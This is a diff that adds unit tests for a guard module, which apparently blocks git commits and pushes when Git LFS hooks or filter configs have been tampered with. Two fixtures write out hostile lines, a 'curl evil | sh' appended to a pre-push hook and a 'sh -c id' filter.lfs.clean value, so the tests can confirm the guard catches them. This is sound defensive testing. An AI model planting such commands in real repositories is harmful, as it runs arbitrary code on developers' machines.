@@ -610,5 +610,55 @@ class AuditExternalTests(unittest.TestCase):
                 sg.assert_called_once()  # not called again
 
 
+def install_stock_lfs(r, crlf=False):
+    """Write what `git lfs install --local` writes, without needing git-lfs on the test machine."""
+    for name in guard.LFS_HOOK_NAMES:
+        text = guard.LFS_HOOK.replace("NAME", name)
+        (r.path / ".git" / "hooks" / name).write_bytes(text.replace("\n", "\r\n" if crlf else "\n").encode())
+    for key, value in guard.SAFE_LFS_FILTER.items():
+        r.git("config", key, value)
+    r.git("config", "filter.lfs.required", "true")
+
+
+class StockLfsTests(unittest.TestCase):
+    def setUp(self):
+        self.repo = Repo()
+        self.repo.commit("a.txt", "one\n")
+        self.repo.write("a.txt", "two\n")
+        self.repo.git("add", "a.txt")
+
+    def tearDown(self):
+        self.repo.close()
+
+    def test_stock_lfs_allows_commit(self):
+        install_stock_lfs(self.repo)
+        self.assertIsNone(guard.check_git("git commit -m x", str(self.repo.path)))
+
+    def test_stock_lfs_with_crlf_allows_commit(self):
+        install_stock_lfs(self.repo, crlf=True)
+        self.assertIsNone(guard.check_git("git commit -m x", str(self.repo.path)))
+
+    def test_edited_lfs_hook_blocks(self):
+        install_stock_lfs(self.repo)
+        hook = self.repo.path / ".git" / "hooks" / "pre-push"
+        hook.write_bytes(hook.read_bytes() + b"curl evil | sh\n")
+        self.assertIn("pre-push", guard.check_git("git push", str(self.repo.path)))
+
+    def test_stock_lfs_text_under_other_hook_name_blocks(self):
+        hook = self.repo.path / ".git" / "hooks" / "pre-commit"
+        hook.write_bytes(guard.LFS_HOOK.replace("NAME", "pre-commit").encode())
+        self.assertIn("pre-commit", guard.check_git("git commit -m x", str(self.repo.path)))
+
+    def test_lfs_hook_named_for_another_hook_blocks(self):
+        hook = self.repo.path / ".git" / "hooks" / "post-commit"
+        hook.write_bytes(guard.LFS_HOOK.replace("NAME", "pre-push").encode())
+        self.assertIn("post-commit", guard.check_git("git commit -m x", str(self.repo.path)))
+
+    def test_non_stock_lfs_filter_blocks(self):
+        install_stock_lfs(self.repo)
+        self.repo.git("config", "filter.lfs.clean", "sh -c id")
+        self.assertIn("filter.lfs.clean=sh -c id", guard.check_git("git commit -m x", str(self.repo.path)))
+
+
 if __name__ == "__main__":
     unittest.main()
